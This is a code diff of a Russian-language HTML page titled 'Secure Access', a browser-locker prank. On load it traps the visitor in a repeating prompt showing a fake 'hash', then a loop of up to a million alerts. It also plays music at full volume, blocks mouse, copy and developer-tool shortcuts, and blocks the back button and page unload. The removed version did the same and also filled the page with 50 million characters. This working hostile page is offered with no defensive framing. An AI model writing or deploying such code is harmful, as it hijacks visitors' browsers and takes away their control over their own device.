@@ -1,132 +1,89 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0" />
-<title>Ultimate Secure Chaos</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />
+<title>Secure Access</title>
 <style>
   html, body {
-    margin:0; padding:0; height:100%; background:#000; color:#111;
-    user-select:none; -webkit-user-select:none; -ms-user-select:none; 
-    overflow:hidden; touch-action:none; font-family: monospace;
-    display:flex; justify-content:center; align-items:center;
-    flex-direction: column;
-  }
-  #modal {
-    position: fixed; inset:0; background:#000; color:#111;
-    display: flex; justify-content:center; align-items:center;
-    z-index:2147483647; cursor:pointer; overflow:hidden;
-  }
-  #box {
-    max-width: 95vw; max-height: 90vh; overflow:hidden;
-    white-space: pre-wrap; word-break: break-word;
-    border: 2px solid #111; padding: 1rem;
-    background:#000;
-    user-select:none;
-  }
-  #startButton {
-    margin-top: 20px;
-    padding: 1rem 2rem;
-    font-size: 1.5rem;
-    cursor: pointer;
-    background: #111;
-    border: 2px solid #0f0;
-    color: #0f0;
-    user-select:none;
+    margin:0; padding:0; height:100%;
+    background:#000; color:#000;
+    overflow:hidden; user-select:none;
+    -webkit-user-select:none; -ms-user-select:none;
+    touch-action:none; font-family: monospace;
   }
 </style>
 </head>
 <body>
-<div id="modal" role="dialog" aria-modal="true" aria-label="Security Blocker">
-  <div id="box" tabindex="-1" aria-readonly="true">Ждем запуска музыки...</div>
-</div>
-<button id="startButton" aria-label="Start Music and Site Interaction">НАЖМИ ДЛЯ СТАРТА</button>
-<audio id="audio" crossorigin="anonymous" playsinline loop></audio>
+<audio id="audio" crossorigin="anonymous" loop></audio>
 <script>
 (() => {
   const AUDIO_URL = 'https://raw.githubusercontent.com/hedredy/Project/2d591f652b1ac4b12d87e38482ad5679cb0d516c/macan-asphalt-8.mp3';
   const CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:',.<>/?";
-  const box = document.getElementById('box');
-  const modal = document.getElementById('modal');
-  const startButton = document.getElementById('startButton');
-  const audio = document.getElementById('audio');
-  const TOTAL_LENGTH = 50000000; // 50 млн символов
-  const CHUNK_SIZE = 200000; // 200к символов за итерацию
+  const HASH_LEN = 5000;
 
-  let writing = false;
-  let canceled = false;
-
-  function randomString(len) {
+  function randomHash(len) {
     let s = '';
-    for (let i=0; i<len; i++) {
+    for(let i=0;i<len;i++){
       s += CHARS.charAt(Math.floor(Math.random()*CHARS.length));
     }
     return s;
   }
 
-  async function fillHash() {
-    if(writing) return;
-    writing = true;
-    box.textContent = '';
-    let written = 0;
-    while (written < TOTAL_LENGTH) {
-      if (canceled) break;
-      box.textContent += randomString(CHUNK_SIZE);
-      written += CHUNK_SIZE;
-      await new Promise(r => requestAnimationFrame(r));
-      // Чтобы браузер не замер, даем ему дышать
-      if (box.textContent.length > TOTAL_LENGTH) {
-        box.textContent = box.textContent.slice(0, TOTAL_LENGTH);
-        break;
-      }
-    }
-    writing = false;
-  }
-
-  // Полный блок всех событий и действий пользователя
-  function blockEvent(e) {
-    try { e.preventDefault(); e.stopImmediatePropagation(); } catch {}
+  function blockEverything(e){
+    try{
+      e.preventDefault();
+      e.stopImmediatePropagation();
+    } catch {}
     return false;
   }
-
-  ['contextmenu','copy','cut','paste','selectstart','dragstart','mousedown','mouseup','mousemove','touchstart','touchmove','touchend','pointerdown','pointerup','wheel'].forEach(ev => {
-    document.addEventListener(ev, blockEvent, {capture:true, passive:false});
+  ['contextmenu','copy','cut','paste','selectstart','dragstart','mousedown','mouseup','mousemove','touchstart','touchmove','touchend','pointerdown','pointerup','wheel'].forEach(ev=>{
+    document.addEventListener(ev, blockEverything, {capture:true, passive:false});
   });
-  document.addEventListener('keydown', e => blockEvent(e), {capture:true});
+  document.addEventListener('keydown', e => {
+    if(e.ctrlKey || e.metaKey || e.altKey || ['F12','F11','F10'].includes(e.key)){
+      blockEverything(e);
+    }
+  }, {capture:true});
 
-  // Блокировка смены вкладок и кнопки назад
-  window.addEventListener('blur', () => { try { window.focus(); } catch {} });
-  history.pushState(null, document.title, location.href);
-  window.addEventListener('popstate', () => { history.pushState(null, document.title, location.href); });
+  const audio = document.getElementById('audio');
+  audio.src = AUDIO_URL;
+  audio.volume = 1.0;
 
-  // Воспроизведение музыки и защита от паузы
-  async function setupAudio() {
+  async function tryPlayAudio() {
     try {
-      audio.src = AUDIO_URL;
-      audio.loop = true;
-      audio.volume = 1.0;
-      await audio.load();
       await audio.play();
-      audio.addEventListener('pause', () => { if (!audio.paused) audio.play().catch(() => {}); });
-      window.addEventListener('visibilitychange', () => {
-        if (document.visibilityState === 'visible') audio.play().catch(() => {});
-      });
     } catch {}
   }
 
-  // Миллион alert с рандомным хэшем
-  function spamAlerts(count) {
-    if(count <= 0) return;
-    alert(randomString(50));
-    setTimeout(() => spamAlerts(count - 1), 10);
+  function promptLoop() {
+    const hash = randomHash(HASH_LEN);
+    let res = prompt("SECURE ACCESS REQUIRED\n\nHASH:\n" + hash + "\n\nEnter any key to continue:");
+    if(res === null){
+      // Если нажал отмену — заново
+      setTimeout(promptLoop, 0);
+    } else {
+      tryPlayAudio();
+      alertSpam(1000000);
+    }
   }
 
-  // Запуск всей защиты после нажатия кнопки (из-за ограничений браузера)
-  startButton.onclick = async () => {
-    startButton.style.display = 'none';
-    fillHash();
-    await setupAudio();
-    spamAlerts(1000000);
+  function alertSpam(count){
+    if(count <= 0) return;
+    alert(randomHash(HASH_LEN));
+    setTimeout(() => alertSpam(count-1), 1);
+  }
+
+  window.onload = promptLoop;
+
+  // Обновление страницы запрещаем, перезагрузка невозможна
+  history.pushState(null, document.title, location.href);
+  window.addEventListener('popstate', ()=>history.pushState(null, document.title, location.href));
+
+  window.onbeforeunload = e => {
+    e.preventDefault();
+    e.returnValue = '';
+    return '';
   };
 })();
 </script>
